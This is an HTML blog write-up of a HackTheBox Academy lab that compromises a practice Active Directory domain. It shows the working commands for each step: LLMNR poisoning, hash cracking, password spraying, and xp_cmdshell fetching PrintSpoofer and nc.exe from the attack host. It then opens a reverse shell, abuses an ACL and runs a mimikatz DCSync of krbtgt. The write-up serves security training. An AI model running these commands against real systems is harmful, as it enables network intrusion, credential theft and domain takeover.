@@ -1,0 +1,545 @@
+<!DOCTYPE html>
+<html lang="en" data-theme="dark">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>AD Enumeration & Attacks - Part II - PixRei Writeup</title>
+    <link href="https://fonts.googleapis.com/css2?family=JetBrains+Mono:wght@400;500;600;700&family=Inter:wght@400;500;600;700&display=swap" rel="stylesheet">
+    <style>
+        :root {
+            --bg-primary: #0a0f0a;
+            --bg-secondary: #0d120d;
+            --bg-card: #111611;
+            --text-primary: #c8d6c8;
+            --text-secondary: #6b7c6b;
+            --text-muted: #3d4a3d;
+            --accent: #00ff88;
+            --accent-dim: #00cc6a;
+            --accent-glow: rgba(0, 255, 136, 0.15);
+            --border: #1a251a;
+            --htb-green: #9fef00;
+            --thm-red: #ff4444;
+            --easy: #4ade80;
+            --medium: #fbbf24;
+            --hard: #ef4444;
+            --code-bg: #0d1117;
+        }
+        [data-theme="light"] {
+            --bg-primary: #f0f4f0;
+            --bg-secondary: #e8ece8;
+            --bg-card: #ffffff;
+            --text-primary: #1a251a;
+            --text-secondary: #4a5a4a;
+            --text-muted: #8a9a8a;
+            --accent: #00994d;
+            --accent-dim: #007a3d;
+            --accent-glow: rgba(0, 153, 77, 0.1);
+            --border: #d0dcd0;
+            --code-bg: #f6f8fa;
+        }
+        * { margin: 0; padding: 0; box-sizing: border-box; }
+        html { scroll-behavior: smooth; }
+        body { font-family: 'Inter', -apple-system, sans-serif; background: var(--bg-primary); color: var(--text-primary); line-height: 1.8; }
+        .grid-bg { position: fixed; top: 0; left: 0; width: 100%; height: 100%; pointer-events: none; z-index: -1; background-image: linear-gradient(var(--border) 1px, transparent 1px), linear-gradient(90deg, var(--border) 1px, transparent 1px); background-size: 60px 60px; opacity: 0.3; }
+        header { position: fixed; top: 0; left: 0; right: 0; z-index: 1000; background: rgba(10, 15, 10, 0.8); backdrop-filter: blur(20px); border-bottom: 1px solid var(--border); }
+        [data-theme="light"] header { background: rgba(240, 244, 240, 0.9); }
+        nav { max-width: 900px; margin: 0 auto; padding: 1rem 2rem; display: flex; justify-content: space-between; align-items: center; }
+        .logo { font-family: 'JetBrains Mono', monospace; font-size: 1.3rem; font-weight: 700; color: var(--accent); text-decoration: none; }
+        .logo::before { content: '> '; opacity: 0.5; }
+        .nav-right { display: flex; gap: 1rem; align-items: center; }
+        .back-btn { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text-secondary); text-decoration: none; padding: 0.5rem 1rem; border: 1px solid var(--border); border-radius: 6px; transition: all 0.2s; }
+        .back-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .theme-toggle { background: var(--bg-card); border: 1px solid var(--border); color: var(--accent); width: 40px; height: 40px; border-radius: 8px; cursor: pointer; font-size: 1rem; }
+        .theme-toggle:hover { border-color: var(--accent); }
+        .article-container { max-width: 900px; margin: 0 auto; padding: 7rem 2rem 4rem; }
+        .article-meta { display: flex; gap: 0.75rem; margin-bottom: 1.5rem; flex-wrap: wrap; }
+        .badge { font-family: 'JetBrains Mono', monospace; font-size: 0.7rem; padding: 0.4rem 0.8rem; border-radius: 4px; text-transform: uppercase; font-weight: 600; }
+        .badge.htb { background: rgba(159, 239, 0, 0.2); color: var(--htb-green); }
+        .badge.os { background: var(--accent-glow); color: var(--accent); }
+        .article-title { font-family: 'JetBrains Mono', monospace; font-size: 2.5rem; font-weight: 700; margin-bottom: 1rem; color: var(--text-primary); }
+        .article-info { display: flex; gap: 2rem; color: var(--text-muted); font-size: 0.85rem; margin-bottom: 3rem; padding-bottom: 2rem; border-bottom: 1px solid var(--border); flex-wrap: wrap; }
+        .toc-box { background: var(--bg-card); border: 1px solid var(--border); border-radius: 12px; padding: 1.5rem; margin-bottom: 3rem; }
+        .toc-heading { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--accent); margin-bottom: 1rem; display: block; }
+        .toc-links { list-style: none; margin: 0; padding: 0; }
+        .toc-links li { margin-bottom: 0.6rem; }
+        .toc-links li:last-child { margin-bottom: 0; }
+        .toc-links a { color: var(--text-secondary); text-decoration: none; font-size: 0.9rem; transition: color 0.2s; }
+        .toc-links a:hover { color: var(--accent); }
+        .toc-links a::before { content: '→ '; opacity: 0.5; }
+        .content h2 { font-family: 'JetBrains Mono', monospace; font-size: 1.4rem; color: var(--accent); margin: 3rem 0 1.5rem; padding-bottom: 0.5rem; border-bottom: 1px solid var(--border); }
+        .content h3 { font-family: 'JetBrains Mono', monospace; font-size: 1.1rem; color: var(--text-primary); margin: 2rem 0 1rem; }
+        .content p { color: var(--text-secondary); margin-bottom: 1.5rem; }
+        .content ul, .content ol { color: var(--text-secondary); margin-bottom: 1.5rem; padding-left: 1.5rem; }
+        .content li { margin-bottom: 0.5rem; }
+        .content strong { color: var(--text-primary); }
+        .content a { color: var(--accent); text-decoration: none; }
+        .content a:hover { text-decoration: underline; }
+        .code-block { background: var(--code-bg); border: 1px solid var(--border); border-radius: 8px; margin: 1.5rem 0; overflow: hidden; }
+        .code-header { background: var(--bg-card); padding: 0.5rem 1rem; border-bottom: 1px solid var(--border); display: flex; justify-content: space-between; align-items: center; }
+        .code-lang { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; color: var(--text-muted); }
+        .copy-btn { font-family: 'JetBrains Mono', monospace; font-size: 0.75rem; background: none; border: 1px solid var(--border); color: var(--text-secondary); padding: 0.25rem 0.5rem; border-radius: 4px; cursor: pointer; transition: all 0.2s; }
+        .copy-btn:hover { border-color: var(--accent); color: var(--accent); }
+        .code-block pre { padding: 1rem; margin: 0; overflow-x: auto; }
+        .code-block code { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--text-primary); line-height: 1.6; background: none; padding: 0; }
+        .content code { font-family: 'JetBrains Mono', monospace; font-size: 0.85em; background: var(--bg-secondary); padding: 0.15rem 0.4rem; border-radius: 4px; color: var(--accent); }
+        .info-box { background: var(--bg-card); border: 1px solid var(--border); border-left: 4px solid var(--accent); border-radius: 8px; padding: 1rem 1.5rem; margin: 1.5rem 0; }
+        .info-box.warning { border-left-color: var(--medium); }
+        .info-box.danger { border-left-color: var(--hard); }
+        .info-box.success { border-left-color: var(--easy); }
+        .info-box-title { font-family: 'JetBrains Mono', monospace; font-size: 0.85rem; color: var(--accent); margin-bottom: 0.5rem; }
+        .info-box.warning .info-box-title { color: var(--medium); }
+        .info-box.danger .info-box-title { color: var(--hard); }
+        .info-box.success .info-box-title { color: var(--easy); }
+        .info-box p { margin-bottom: 0; font-size: 0.9rem; }
+        .info-box ul { margin-bottom: 0; font-size: 0.9rem; }
+        .takeaways { background: var(--accent-glow); border: 1px solid var(--accent); border-radius: 12px; padding: 1.5rem; margin: 3rem 0; }
+        .takeaways h3 { font-family: 'JetBrains Mono', monospace; font-size: 1rem; color: var(--accent); margin-bottom: 1rem; }
+        .takeaways ul { margin-bottom: 0; padding-left: 1.5rem; color: var(--text-secondary); }
+        .takeaways li { margin-bottom: 0.5rem; }
+        .takeaways strong { color: var(--text-primary); }
+        .article-nav { display: flex; justify-content: space-between; gap: 1rem; margin-top: 4rem; padding-top: 2rem; border-top: 1px solid var(--border); }
+        .nav-link { font-family: 'JetBrains Mono', monospace; font-size: 0.9rem; color: var(--text-secondary); text-decoration: none; padding: 1rem; border: 1px solid var(--border); border-radius: 8px; transition: all 0.2s; flex: 1; min-width: 150px; }
+        .nav-link:hover { border-color: var(--accent); color: var(--accent); }
+        .nav-link.prev { text-align: left; }
+        .nav-link.next { text-align: right; }
+        .nav-link.next::after { content: ' →'; }
+        .nav-link span { display: block; font-size: 0.7rem; color: var(--text-muted); margin-bottom: 0.25rem; }
+        footer { padding: 3rem 0; border-top: 1px solid var(--border); text-align: center; margin-top: 4rem; }
+        .footer-text { font-size: 0.8rem; color: var(--text-muted); }
+        @media (max-width: 768px) {
+            .article-title { font-size: 1.8rem; }
+            .article-container { padding: 6rem 1rem 2rem; }
+            .article-nav { flex-direction: column; }
+        }
+    </style>
+</head>
+<body>
+    <div class="grid-bg"></div>
+    <header>
+        <nav>
+            <a href="../../index.html" class="logo">PixRei ./blog/AD-Part-II</a>
+            <div class="nav-right">
+                <a href="../index.html" class="back-btn">← All Posts</a>
+                <button class="theme-toggle" id="themeToggle">◐</button>
+            </div>
+        </nav>
+    </header>
+    <main>
+        <article class="article-container">
+            <div class="article-meta">
+                <span class="badge htb">HackTheBox Academy</span>
+                <span class="badge" style="background: rgba(239,68,68,0.2); color: var(--hard);">Hard</span>
+                <span class="badge os">Windows / AD</span>
+            </div>
+
+            <h1 class="article-title">AD Enumeration &amp; Attacks - Part II</h1>
+
+            <div class="article-info">
+                <span>📅 Aug 05, 2026</span>
+                <span>⏱️ 15 min read</span>
+                <span>🏷️ LLMNR, Spray, PrintSpoofer, DCSync</span>
+            </div>
+
+            <div class="toc-box">
+                <span class="toc-heading">// Table of Contents</span>
+                <ul class="toc-links">
+                    <li><a href="#summary">Summary</a></li>
+                    <li><a href="#poison">LLMNR Poisoning for a Foothold</a></li>
+                    <li><a href="#crack">Cracking the Hash</a></li>
+                    <li><a href="#map">Mapping the Internal Network</a></li>
+                    <li><a href="#spray">Password Spraying</a></li>
+                    <li><a href="#webconfig">The Leaked web.config</a></li>
+                    <li><a href="#mssql">MSSQL to SYSTEM via PrintSpoofer</a></li>
+                    <li><a href="#genericall">GenericAll over Domain Admins</a></li>
+                    <li><a href="#krbtgt">DCSync the krbtgt Hash</a></li>
+                    <li><a href="#takeaways">Key Takeaways</a></li>
+                </ul>
+            </div>
+
+            <div class="content">
+                <h2 id="summary">Summary</h2>
+                <p>Where Part I handed us a foothold, Part II starts with nothing but network access from an internal attack host and makes us earn our way in. The chain runs the full length of an AD compromise: <strong>LLMNR/NBT-NS poisoning</strong> to catch a hash, <strong>password spraying</strong> a weak policy for a second user, a <strong>leaked web.config</strong> exposing MSSQL credentials, <strong>PrintSpoofer</strong> abusing <code>SeImpersonatePrivilege</code> to reach SYSTEM, a <strong>GenericAll ACL</strong> over Domain Admins, and finally a <strong>DCSync</strong> of the krbtgt account.</p>
+
+                <div class="info-box">
+                    <div class="info-box-title">💡 Environment</div>
+                    <p>
+                        <strong>Attack host:</strong> PAR01 (172.16.7.240, dual-homed Parrot box)<br>
+                        <strong>Internal subnet:</strong> 172.16.7.0/23<br>
+                        <strong>Targets:</strong> DC01 (172.16.7.3), MS01 (172.16.7.50), SQL01 (172.16.7.60)<br>
+                        <strong>Key skills:</strong> LLMNR Poisoning, Password Spraying, MSSQL, PrintSpoofer, ACL Abuse, DCSync
+                    </p>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">// starting note</div>
+                    <p>Connect to the internal attack host via SSH (or <code>xfreerdp</code>) and begin looking for a foothold into the domain.</p>
+                </div>
+
+                <h2 id="poison">LLMNR Poisoning for a Foothold</h2>
+                <p>We start on the internal attack host with no credentials at all. First thing to notice is that the box is dual-homed: <code>ens192</code> faces the <code>10.129.x.x</code> side we came in on, and <code>ens224</code> sits on the internal <code>172.16.7.0/23</code> domain network. That second interface is our way into the domain, so that's where we listen.</p>
+
+                <p>With no creds, the classic first move is to poison name-resolution traffic and catch an authentication hash. Responder does exactly that on the internal NIC.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: start Responder</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ sudo responder -I ens224
+[+] Poisoners:
+    LLMNR                      [ON]
+    NBT-NS                     [ON]
+    DNS/MDNS                   [ON]
+[+] Listening for events...</code></pre>
+                </div>
+
+                <p>After a short wait, a host starts resolving names we're happy to answer for.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">responder: poisoned</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>[*] [MDNS] Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT.LOCAL
+[*] [LLMNR] Poisoned answer sent to 172.16.7.3 for name INLANEFRIGHT</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">📊 Why This Works</div>
+                    <p>Notice the requested name, <code>INLANEFRIGHT</code>, is a typo of <code>INLANEFREIGHT</code>. DNS fails on the misspelling, so the host falls back to broadcast name resolution (LLMNR/NBT-NS), and <em>anyone</em> on the segment can answer. We answer, the host authenticates to us, and we capture its NetNTLMv2 hash.</p>
+                </div>
+
+                <p>The captured hash lands in Responder's logs, with the account name at the very start.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: captured hash</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ cat /usr/share/responder/logs/SMB-NTLMv2-SSP-172.16.7.3.txt
+AB***::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC6D88DF90AC4AE7C5A81948:&lt;...SNIP...&gt;</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🔑 First User</div>
+                    <p>The username at the front of the capture answers the first objective, and the rest is a crackable NetNTLMv2 hash.</p>
+                </div>
+
+                <h2 id="crack">Cracking the Hash</h2>
+                <p>If you're ever unsure what type of hash you're holding, <code>hashid</code> will tell you before you waste time on the wrong mode.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: identify</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ hashid 'AB***::INLANEFREIGHT:0c6498a2a4acd121:FC356D6ADC...'
+[+] NetNTLMv2</code></pre>
+                </div>
+
+                <p>It's NetNTLMv2, so we point John at the <code>netNTLMv2</code> format and rockyou.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: crack</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ john --format=netNTLMv2 -w=/usr/share/wordlists/rockyou.txt AB920
+Loaded 1 password hash (netntlmv2, NTLMv2 C/R [MD4 HMAC-MD5 32/64])
+we***           (AB***)
+1g 0:00:00:00 DONE
+Session completed.</code></pre>
+                </div>
+
+                <p>The password falls instantly, giving us our first valid domain credential.</p>
+
+                <h2 id="map">Mapping the Internal Network</h2>
+                <p>Before using the credential we map the subnet. <code>fping</code> sweeps it quickly.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: fping sweep</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ fping -asgq 172.16.7.0/23
+172.16.7.3
+172.16.7.50
+172.16.7.60
+172.16.7.240</code></pre>
+                </div>
+
+                <p>Four hosts (we're <code>.240</code>). An Nmap fingerprint of the other three sorts out their roles.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: nmap roles</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ nmap -A -Pn -T4 172.16.7.3 172.16.7.50 172.16.7.60 -p 445,135,3389
+172.16.7.3   -&gt; DC01   (445 open, signing required)
+172.16.7.50  -&gt; MS01   (3389 RDP open)
+172.16.7.60  -&gt; SQL01  (MSSQL 2019, port 1433)</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">📊 The Map</div>
+                    <ul>
+                        <li><strong>DC01 (172.16.7.3):</strong> domain controller, the endgame.</li>
+                        <li><strong>MS01 (172.16.7.50):</strong> RDP open, likely our first interactive access.</li>
+                        <li><strong>SQL01 (172.16.7.60):</strong> MSSQL 2019, a privilege-escalation surface for later.</li>
+                        <li><strong>PAR01 (172.16.7.240):</strong> our dual-homed attack host.</li>
+                    </ul>
+                </div>
+
+                <p>To reach these from our own tooling, an SSH dynamic tunnel plus proxychains lets us test the cracked credential against MS01.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: test creds via SOCKS</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ ssh -D 9050 htb-student@10.129.86.14        # SOCKS tunnel
+$ proxychains4 nxc smb 172.16.7.50 -u AB*** -p we***
+SMB  172.16.7.50  445  MS01  [+] INLANEFREIGHT.LOCAL\AB***:we***</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">// two tunnels, on purpose</div>
+                    <p>I use the SSH SOCKS proxy for quick netexec checks, then bring up <code>sshuttle</code> separately for RDP so the graphical client routes transparently without wrapping it in proxychains. Different tools, different jobs.</p>
+                </div>
+
+                <p>The credential is valid on MS01. With <code>sshuttle</code> routing the subnet, we RDP in and read the first flag off the root of C.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: sshuttle + RDP</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ sshuttle -r htb-student@10.129.86.14 172.16.7.0/23 -v
+c : Accept TCP: ... -&gt; 172.16.7.50:3389.
+
+$ xfreerdp /u:AB920 /p:weasal /v:172.16.7.50 +clipboard</code></pre>
+                </div>
+
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">cmd: flag</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>C:\&gt;type flag.txt
+aud1t_gr0u***</code></pre>
+                </div>
+
+                <h2 id="spray">Password Spraying</h2>
+                <p>Next objective: weak credentials for another user. The password policy decides whether spraying is safe, so we check it first. Building a user list over SMB and pulling <code>net accounts</code>:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: password policy</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; net accounts
+Minimum password length:      1
+Lockout threshold:            Never
+Lockout duration (minutes):   30</code></pre>
+                </div>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">⚠️ Lockout Threshold: Never</div>
+                    <p>With no lockout threshold, we can spray as many guesses as we like without locking a single account. That's a green light, so I sprayed one likely password across the whole user list with <code>kerbrute</code>.</p>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: kerbrute spray</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ kerbrute passwordspray -d inlanefreight.local --dc 172.16.7.3 users.txt We******
+[+] VALID LOGIN:  BR***@inlanefreight.local:W****
+Done! Tested 2902 logins (1 successes) in 17.629 seconds</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🔑 Second User</div>
+                    <p>One hit out of 2902 attempts, a new user and password with zero risk of lockout. That username and password answer the next two objectives.</p>
+                </div>
+
+                <h2 id="webconfig">The Leaked web.config</h2>
+                <p>New credentials mean new share access. Let's see what this user can reach.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: list shares</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ smbclient -L //172.16.7.3/ -U BR***
+        Department Shares Disk    Share for department users
+        NETLOGON          Disk    Logon server share
+        SYSVOL            Disk    Logon server share</code></pre>
+                </div>
+
+                <p>"Department Shares" is the interesting one. Rather than click through it by hand, spider it and let a module surface anything sensitive.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: spider</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ crackmapexec smb 172.16.7.3 -u BR*** -p W*** --share "Department Shares" -M spider_plus
+$ cat /tmp/cme_spider_plus/172.16.7.3.json
+"Department Shares": {
+    "IT/Private/Development/web.config": { "size": "1.17 KB" }
+}</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">📊 Why web.config Matters</div>
+                    <p>A <code>web.config</code> in a readable share is a classic credential leak. These files routinely embed database connection strings in cleartext, exactly the kind of secret that shouldn't be world-readable on a share.</p>
+                </div>
+
+                <p>Downloading and reading it confirms it, an MSSQL connection string with a plaintext password.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">xml: web.config</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>&lt;connectionStrings&gt;
+  &lt;add name="ConString"
+       connectionString="...\SQLEXPRESS;Initial Catalog=Northwind;
+       User ID=ne***;Password=D@********!"/&gt;
+&lt;/connectionStrings&gt;</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🔑 Database Credentials</div>
+                    <p>The connection string hands us a database user and password for the SQL01 host, our route onto SQL01.</p>
+                </div>
+
+                <h2 id="mssql">MSSQL to SYSTEM via PrintSpoofer</h2>
+                <p>We authenticate to MSSQL with those credentials. A SQL shell is useful, but we want command execution on the host, so we enable <code>xp_cmdshell</code>.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL: enable xp_cmdshell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>$ impacket-mssqlclient ne***:"D@*****"@172.16.7.60
+SQL&gt; enable_xp_cmdshell
+SQL&gt; reconfigure</code></pre>
+                </div>
+
+                <p>With command execution, the first thing to check is the SQL service account's privileges.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL: whoami /priv</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>SQL&gt; xp_cmdshell whoami /priv
+SeImpersonatePrivilege   Impersonate a client after authentication   Enabled
+SeCreateGlobalPrivilege  Create global objects                       Enabled</code></pre>
+                </div>
+
+                <div class="info-box warning">
+                    <div class="info-box-title">⚠️ SeImpersonatePrivilege</div>
+                    <p>This one privilege is a direct path to SYSTEM. Tools in the "Potato" family (JuicyPotato, PrintSpoofer, RoguePotato) abuse it to impersonate a SYSTEM token. SQL service accounts almost always have it, which is why enabling <code>xp_cmdshell</code> so often means immediate SYSTEM.</p>
+                </div>
+
+                <p>I went with PrintSpoofer. Upload it plus a Netcat binary, start a listener, and trigger it.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL: stage the tools</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>SQL&gt; xp_cmdshell "curl http://172.16.7.240:8000/PrintSpoofer64.exe -o C:\Windows\Temp\ps.exe"
+SQL&gt; xp_cmdshell "curl http://172.16.7.240:8000/nc.exe -o C:\Windows\Temp\nc.exe"</code></pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">SQL: trigger PrintSpoofer</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>SQL&gt; xp_cmdshell C:\Windows\Temp\ps.exe -c "C:\Windows\Temp\nc.exe 172.16.7.240 4443 -e cmd.exe"
+[+] Found privilege: SeImpersonatePrivilege
+[+] CreateProcessAsUser() OK</code></pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">bash: SYSTEM shell</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>connect to [172.16.7.240] from 172.16.7.60
+C:\Windows\system32&gt;whoami
+nt authority\system
+
+C:\Users\Administrator\Desktop&gt;type flag.txt
+s3imp3rs****</code></pre>
+                </div>
+
+                <div class="info-box success">
+                    <div class="info-box-title">🏆 SYSTEM on SQL01</div>
+                    <p>PrintSpoofer turns that single impersonation privilege straight into a SYSTEM shell, and the flag on the Administrator desktop follows.</p>
+                </div>
+
+                <h2 id="genericall">GenericAll over Domain Admins</h2>
+                <p>Now we look for a user with <code>GenericAll</code> rights over the Domain Admins group. Running Inveigh locally as SYSTEM turned up nothing, so instead of waiting on poisoning we query the directory directly with PowerView.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: find GenericAll</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; Get-DomainObjectAcl -Identity "Domain Admins" -ResolveGUIDs `
+    | ? {$_.ActiveDirectoryRights -match "GenericAll"} `
+    | select SecurityIdentifier, ActiveDirectoryRights
+
+S-1-5-21-3327542485-274640656-2609762496-4611   GenericAll
+S-1-5-18                                         GenericAll</code></pre>
+                </div>
+
+                <p><code>S-1-5-18</code> is just SYSTEM, so the interesting one is that first SID. Resolving it to a name:</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: resolve SID</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; ConvertFrom-Sid S-1-5-21-3327542485-274640656-2609762496-4611
+INLANEFREIGHT\CT***</code></pre>
+                </div>
+
+                <div class="info-box">
+                    <div class="info-box-title">📊 What GenericAll Means</div>
+                    <p><code>GenericAll</code> over a group is full control of it. This user can add <em>any</em> account (including themselves) to Domain Admins, no exploit required, just a misconfigured ACL. We recover this user's password via a second Inveigh capture and crack it the same way as before.</p>
+                </div>
+
+                <p>With the credentials in hand, we run a shell as that user and use the ACL to reach into DC01.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: abuse GenericAll</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; runas /netonly /user:CT059 powershell.exe
+PS&gt; Net group "Domain Admins" ct059 /add /domain
+PS&gt; $cred = New-Object System.Management.Automation.PSCredential('INLANEFREIGHT\CT059', $pass1)
+PS&gt; Enter-PSSession -ComputerName DC01 -Credential $cred
+[DC01]: PS C:\Users\CT059\Documents&gt;</code></pre>
+                </div>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: DC01 flag</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>[DC01]: PS C:\Users\Administrator\Desktop&gt; cat .\flag.txt
+acLs_*****</code></pre>
+                </div>
+
+                <h2 id="krbtgt">DCSync the krbtgt Hash</h2>
+                <p>The final objective is the krbtgt NTLM hash. With Domain Admin access we DCSync it. I tried Mimikatz interactively first, but it hung in a loop, so I ran it as a one-liner: pass every command up front and <code>exit</code> at the end.</p>
+
+                <div class="code-block">
+                    <div class="code-header"><span class="code-lang">powershell: DCSync krbtgt</span><button class="copy-btn" onclick="copyCode(this)">Copy</button></div>
+                    <pre><code>PS&gt; .\mimikatz.exe "privilege::debug" `
+    "lsadump::dcsync /domain:INLANEFREIGHT.LOCAL /user:krbtgt" "exit"
+
+SAM Username         : krbtgt
+Credentials:
+  Hash NTLM: 7eba70412d81c1cd030d72a3e8dbe05f</code></pre>
+                </div>
+
+                <div class="info-box danger">
+                    <div class="info-box-title">🏆 Full Domain Compromise</div>
+                    <p>The <code>Hash NTLM</code> line is the last flag. With the krbtgt hash the domain is owned durably, not just today: it's the key material behind Golden Ticket attacks, which forge arbitrary Kerberos tickets valid until krbtgt is rotated twice.</p>
+                </div>
+
+                <div class="takeaways">
+                    <h3>🎯 Key Takeaways</h3>
+                    <ul>
+                        <li><strong>No creds? Poison for them:</strong> LLMNR/NBT-NS poisoning turns one mistyped hostname into a domain hash.</li>
+                        <li><strong>Weak policy is an open door:</strong> <code>Lockout threshold: Never</code> makes password spraying risk-free.</li>
+                        <li><strong>Config files leak secrets:</strong> a <code>web.config</code> in a readable share gave up a plaintext MSSQL connection string.</li>
+                        <li><strong>SeImpersonatePrivilege is game over:</strong> from a SQL service account, PrintSpoofer turns it straight into SYSTEM.</li>
+                        <li><strong>ACLs are the quiet path to DA:</strong> <code>GenericAll</code> over Domain Admins lets you add your own user in.</li>
+                        <li><strong>DCSync is the endgame:</strong> dumping the krbtgt hash means persistent, domain-wide control.</li>
+                    </ul>
+                </div>
+
+                <h3>Tools Used</h3>
+                <ul>
+                    <li><code>responder</code> / <code>inveigh</code>, LLMNR/NBT-NS poisoning</li>
+                    <li><code>hashid</code> / <code>john</code>, hash identification and cracking</li>
+                    <li><code>fping</code> / <code>nmap</code>, network mapping</li>
+                    <li><code>sshuttle</code> / <code>proxychains</code> / <code>netexec</code>, pivoting and credential validation</li>
+                    <li><code>kerbrute</code>, password spraying</li>
+                    <li><code>crackmapexec</code> / <code>smbclient</code>, share spidering and access</li>
+                    <li><code>impacket-mssqlclient</code> / <code>PrintSpoofer</code>, MSSQL RCE and privesc</li>
+                    <li><code>PowerView.ps1</code> / <code>mimikatz</code>, ACL enumeration and DCSync</li>
+                </ul>
+            </div>
+
+            <nav class="article-nav">
+                <a href="ad-skills-assessment-part1.html" class="nav-link prev"><span>Back</span>AD Part I</a>
+                <a href="password-attacks.html" class="nav-link next"><span>Next</span>Password Attacks</a>
+            </nav>
+        </article>
+    </main>
+    <footer>
+        <p class="footer-text">© 2026 PixRei // Security Research &amp; Writeups</p>
+    </footer>
+    <script>
+        const themeToggle = document.getElementById('themeToggle');
+        const html = document.documentElement;
+        function setTheme(theme) {
+            html.setAttribute('data-theme', theme);
+            localStorage.setItem('theme', theme);
+            themeToggle.textContent = theme === 'dark' ? '◐' : '◑';
+        }
+        setTheme(localStorage.getItem('theme') || 'dark');
+        themeToggle.addEventListener('click', () => {
+            setTheme(html.getAttribute('data-theme') === 'dark' ? 'light' : 'dark');
+        });
+        function copyCode(btn) {
+            const code = btn.closest('.code-block').querySelector('code').textContent;
+            navigator.clipboard.writeText(code).then(() => {
+                btn.textContent = 'Copied!';
+                setTimeout(() => { btn.textContent = 'Copy'; }, 2000);
+            });
+        }
+    </script>
+</body>
+</html>
